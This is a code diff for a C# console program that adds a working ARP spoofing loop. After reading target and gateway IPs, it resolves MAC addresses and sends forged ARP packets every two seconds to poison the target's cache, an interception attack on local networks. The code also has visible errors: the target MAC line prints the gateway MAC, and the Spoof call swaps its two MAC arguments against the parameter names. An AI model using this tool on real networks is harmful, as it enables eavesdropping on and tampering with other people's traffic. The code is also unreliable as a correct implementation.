@@ -45,12 +45,19 @@ class Program
         Console.Write("Enter the target Gateway IP address: ");
         gatewayIp = IPAddress.Parse(Console.ReadLine());
 
-        // Get MAC from IP ADDRESS
-
+        targetMac = GetMacFromIp(device, targetIp);
         gatewayMac = GetMacFromIp(device, gatewayIp);
         Console.WriteLine("Gateway MAC: {0}", gatewayMac);
+        Console.WriteLine("Target MAC: {0}", gatewayMac);
+
+        while (true)
+        {
+            Spoof(device, PhysicalAddress.Parse(gatewayMac), PhysicalAddress.Parse(targetMac));
+            Thread.Sleep(2000);
+        }
     }
 
+    // Get MAC from IP ADDRESS
     static string GetMacFromIp(ILiveDevice device, IPAddress ip)
     {
         var broadcastMac = PhysicalAddress.Parse("FF-FF-FF-FF-FF-FF");
@@ -101,6 +108,25 @@ class Program
         return string.IsNullOrEmpty(targetMac) ? null : FormatedMac(PhysicalAddress.Parse(targetMac));
     }
 
+    static void Spoof(ILiveDevice device, PhysicalAddress targetMac, PhysicalAddress gatewayMac)
+    {
+        var arpRequest = new ArpPacket(
+            ArpOperation.Request,
+            gatewayMac,
+            gatewayIp,
+            targetMac,
+            gatewayIp
+        );
+
+        var ethernetPacket = new EthernetPacket(device.MacAddress, targetMac, EthernetType.Arp);
+        ethernetPacket.PayloadPacket = arpRequest;
+
+        device.SendPacket(ethernetPacket);
+
+        Console.WriteLine($"* Spoofed * {gatewayIp} -> {targetMac}");
+    }
+
+    // Format MAC ADDRESS
     static string FormatedMac(PhysicalAddress mac)
     {
         return string.Join(":", mac.GetAddressBytes().Select(b => b.ToString("X2")));
